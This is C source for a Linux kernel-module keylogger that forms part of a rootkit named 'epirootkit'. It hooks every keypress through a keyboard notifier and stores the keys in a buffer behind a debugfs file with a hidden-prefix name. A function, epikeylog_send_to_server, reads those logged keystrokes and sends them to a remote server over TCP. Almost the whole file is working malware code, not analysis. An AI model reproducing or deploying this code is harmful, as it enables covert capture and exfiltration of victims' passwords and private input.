#include <linux/debugfs.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/moduleparam.h>

#include "epirootkit.h"
#include "io.h"

#define BUF_LEN (PAGE_SIZE << 2)
#define CHUNK_LEN 12

// Keymap for each key (US keyboard layout)
static const char *keymap[][2] = {
    { "\0", "\0" },                   // 0
    { "_ESC_", "_ESC_" },             // 1
    { "1", "!" },                     // 2
    { "2", "@" },                     // 3
    { "3", "#" },                     // 4
    { "4", "$" },                     // 5
    { "5", "%" },                     // 6
    { "6", "^" },                     // 7
    { "7", "&" },                     // 8
    { "8", "*" },                     // 9
    { "9", "(" },                     // 10
    { "0", ")" },                     // 11
    { "-", "_" },                     // 12
    { "=", "+" },                     // 13
    { "_BACKSPACE_", "_BACKSPACE_" }, // 14
    { "_TAB_", "_TAB_" },             // 15
    { "q", "Q" },                     // 16
    { "w", "W" },                     // 17
    { "e", "E" },                     // 18
    { "r", "R" },                     // 19
    { "t", "T" },                     // 20
    { "y", "Y" },                     // 21
    { "u", "U" },                     // 22
    { "i", "I" },                     // 23
    { "o", "O" },                     // 24
    { "p", "P" },                     // 25
    { "[", "{" },                     // 26
    { "]", "}" },                     // 27
    { "\n", "\n" },                   // 28
    { "_LCTRL_", "_LCTRL_" },         // 29
    { "a", "A" },                     // 30
    { "s", "S" },                     // 31
    { "d", "D" },                     // 32
    { "f", "F" },                     // 33
    { "g", "G" },                     // 34
    { "h", "H" },                     // 35
    { "j", "J" },                     // 36
    { "k", "K" },                     // 37
    { "l", "L" },                     // 38
    { ";", ":" },                     // 39
    { "'", "\"" },                    // 40
    { "`", "~" },                     // 41
    { "_LSHIFT_", "_LSHIFT_" },       // 42
    { "\\", "|" },                    // 43
    { "z", "Z" },                     // 44
    { "x", "X" },                     // 45
    { "c", "C" },                     // 46
    { "v", "V" },                     // 47
    { "b", "B" },                     // 48
    { "n", "N" },                     // 49
    { "m", "M" },                     // 50
    { ",", "<" },                     // 51
    { ".", ">" },                     // 52
    { "/", "?" },                     // 53
    { "_RSHIFT_", "_RSHIFT_" },       // 54
    { "_PRTSCR_", "_KPD*_" },         // 55
    { "_LALT_", "_LALT_" },           // 56
    { " ", " " },                     // 57
    { "_CAPS_", "_CAPS_" },           // 58
    { "F1", "F1" },                   // 59
    { "F2", "F2" },                   // 60
    { "F3", "F3" },                   // 61
    { "F4", "F4" },                   // 62
    { "F5", "F5" },                   // 63
    { "F6", "F6" },                   // 64
    { "F7", "F7" },                   // 65
    { "F8", "F8" },                   // 66
    { "F9", "F9" },                   // 67
    { "F10", "F10" },                 // 68
    { "_NUM_", "_NUM_" },             // 69
    { "_SCROLL_", "_SCROLL_" },       // 70
    { "_KPD7_", "_HOME_" },           // 71
    { "_KPD8_", "_UP_" },             // 72
    { "_KPD9_", "_PGUP_" },           // 73
    { "-", "-" },                     // 74
    { "_KPD4_", "_LEFT_" },           // 75
    { "_KPD5_", "_KPD5_" },           // 76
    { "_KPD6_", "_RIGHT_" },          // 77
    { "+", "+" },                     // 78
    { "_KPD1_", "_END_" },            // 79
    { "_KPD2_", "_DOWN_" },           // 80
    { "_KPD3_", "_PGDN" },            // 81
    { "_KPD0_", "_INS_" },            // 82
    { "_KPD._", "_DEL_" },            // 83
    { "_SYSRQ_", "_SYSRQ_" },         // 84
    { "\0", "\0" },                   // 85
    { "\0", "\0" },                   // 86
    { "F11", "F11" },                 // 87
    { "F12", "F12" },                 // 88
    { "\0", "\0" },                   // 89
    { "\0", "\0" },                   // 90
    { "\0", "\0" },                   // 91
    { "\0", "\0" },                   // 92
    { "\0", "\0" },                   // 93
    { "\0", "\0" },                   // 94
    { "\0", "\0" },                   // 95
    { "_KPENTER_", "_KPENTER_" },     // 96
    { "_RCTRL_", "_RCTRL_" },         // 97
    { "/", "/" },                     // 98
    { "_PRTSCR_", "_PRTSCR_" },       // 99
    { "_RALT_", "_RALT_" },           // 100
    { "\0", "\0" },                   // 101
    { "_HOME_", "_HOME_" },           // 102
    { "_UP_", "_UP_" },               // 103
    { "_PGUP_", "_PGUP_" },           // 104
    { "_LEFT_", "_LEFT_" },           // 105
    { "_RIGHT_", "_RIGHT_" },         // 106
    { "_END_", "_END_" },             // 107
    { "_DOWN_", "_DOWN_" },           // 108
    { "_PGDN", "_PGDN" },             // 109
    { "_INS_", "_INS_" },             // 110
    { "_DEL_", "_DEL_" },             // 111
    { "\0", "\0" },                   // 112
    { "\0", "\0" },                   // 113
    { "\0", "\0" },                   // 114
    { "\0", "\0" },                   // 115
    { "\0", "\0" },                   // 116
    { "\0", "\0" },                   // 117
    { "\0", "\0" },                   // 118
    { "_PAUSE_", "_PAUSE_" },         // 119
};

// Prototypes and global variables

// Indicates if the keylogger is currently running
static bool is_running = false;

// Debugfs file and directory pointers
static struct dentry *file;
static struct dentry *subdir;

// Buffer position and buffer for storing logged keys
static size_t buf_pos;
static char keys_buf[BUF_LEN];

// Static functions prototypes (boring to have it there but needed due to usage just below)
static ssize_t keys_read(struct file *filp,
                         char *buffer,
                         size_t len,
                         loff_t *offset) {
    return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static int epikeylog_callback(struct notifier_block *nblock,
                              unsigned long code,
                              void *_param);

// File operations structure for the debugfs file
const struct file_operations keys_fops = {
    .owner = THIS_MODULE,
    .read = keys_read,
};

// Notifier block structure for keyboard events
static struct notifier_block epikeylog_blk = {
    .notifier_call = epikeylog_callback,
};

/**
 * keycode_to_string - convert keycode to readable string and save in buffer
 *
 * @param keycode keycode generated by the kernel on keypress
 * @param shift_mask Shift key pressed or not
 * @param buf buffer to store readable string
 */
static void keycode_to_string(int keycode, int shift_mask, char *buf) {
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
        const char *key = (shift_mask == 1)
            ? keymap[keycode][1]
            : keymap[keycode][0];

        snprintf(buf, CHUNK_LEN, "%s", key);
    }
}

/**
 * epikeylog_callback - callback function for keyboard notifier
 *
 * This function is called on every key event and logs the key pressed
 * to the debugfs file.
 *
 * @param nblock Notifier block structure
 * @param code Event code (e.g., KEY_PRESS, KEY_RELEASE)
 * @param _param Pointer to keyboard_notifier_param structure containing
 *
 * Returns NOTIFY_OK on success, otherwise an error code.
 */
int epikeylog_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
    size_t len;
    char keybuf[CHUNK_LEN] = { 0 };
    struct keyboard_notifier_param *param = _param;

    pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
             code, param->down, param->shift, param->value);

    // detect if the key event is a key press
    if (!(param->down))
        return NOTIFY_OK;

    // Convert keycode to readable string
    keycode_to_string(param->value, param->shift, keybuf);
    len = strlen(keybuf);
    if (len < 1)
        return NOTIFY_OK;

    if ((buf_pos + len) >= BUF_LEN)
        buf_pos = 0;

    strncpy(keys_buf + buf_pos, keybuf, len);
    buf_pos += len;

    pr_debug("%s\n", keybuf);

    return NOTIFY_OK;
}

/**
 * epikeylog_send_to_server - send keylogger content to the server
 *
 * This function reads the keylogger content from the debugfs file
 * and sends it to the server using the send_to_server_raw function.
 *
 * Returns 0 on success, otherwise an error code.
 */
int epikeylog_send_to_server(void) {
    if (!is_running) {
        DBG_MSG("epikeylog_send_to_server: not running\n");

        send_to_server(TCP, "epikeylog_send_to_server: not running. Activate it with `klgon`.\n");

        return -EBUSY;
    }

    char *full_cmd = kzalloc(PATH_MAX, GFP_KERNEL);
    if (!full_cmd) {
        ERR_MSG("epikeylog_send_to_server: failed to allocate memory for full_cmd\n");
        return -ENOMEM;
    }
    snprintf(full_cmd, PATH_MAX, "cat /sys/kernel/debug/%sklg/keys", HIDDEN_PREFIX);

    exec_str_as_command(full_cmd, true);

    int readed_size = 0;
    char *keys_content;
    readed_size = _read_file(STDOUT_FILE, &keys_content);

    int ret_code = send_to_server_raw(keys_content, readed_size);
    DBG_MSG("epikeylog_send_to_server: keylogger content sent\n");

    kfree(full_cmd);
    if (keys_content) {
        kfree(keys_content);
    }

    return ret_code;
}

/**
 * epikeylog_init - module entry point
 *
 * Creates required debugfs directory and files
 * Registers the keyboard structure notifier_block
 *
 * Returns 0 on successful initialization, otherwise
 * the appropriate error code in case of any error
 */
int epikeylog_init(int keylog_mode) {
    DBG_MSG("epikeylog_init: initializing keylogger\n");

    if (is_running) {
        DBG_MSG("epikeylog_init: already running\n");
        return SUCCESS;
    }

    char *dir_name = kzalloc(PATH_MAX, GFP_KERNEL);
    if (!dir_name) {
        ERR_MSG("epikeylog_init: failed to allocate memory for dir_name\n");
        return -ENOMEM;
    }
    snprintf(dir_name, PATH_MAX, "%s%s", HIDDEN_PREFIX, "klg");
    subdir = debugfs_create_dir(dir_name, NULL);
    kfree(dir_name);

    if (IS_ERR(subdir)) {
        ERR_MSG("epikeylog_init: failed to create debugfs directory\n");
        return PTR_ERR(subdir);
    }
    if (!subdir) {
        ERR_MSG("epikeylog_init: debugfs directory is NULL\n");
        return -ENOENT;
    }

    file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
    if (!file) {
        ERR_MSG("epikeylog_init: failed to create debugfs file\n");
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }

    if (register_keyboard_notifier(&epikeylog_blk) != 0) {
        ERR_MSG("epikeylog_init: failed to register keyboard notifier\n");
        debugfs_remove_recursive(subdir);
        return -EIO;
    }

    is_running = true;
    DBG_MSG("epikeylog_init: keylogger initialized successfully\n");

    return SUCCESS;
}

/**
 * epikeylog_exit - module exit function
 *
 * Unregisters the module from the kernel
 * Cleans up the debugfs directory to log keys
 */
int epikeylog_exit(void) {
    if (!is_running) {
        DBG_MSG("epikeylog_exit: already stopped\n");
        return SUCCESS;
    }

    if (unregister_keyboard_notifier(&epikeylog_blk) != 0) {
        ERR_MSG("epikeylog_exit: failed to unregister keyboard notifier\n");
        return -EIO;
    }

    if (!subdir || IS_ERR(subdir)) {
        ERR_MSG("epikeylog_exit: invalid debugfs directory\n");
        return -EIO;
    }

    debugfs_remove_recursive(subdir);
    is_running = false;
    DBG_MSG("epikeylog_exit: epikeylog desactivated\n");

    return SUCCESS;
}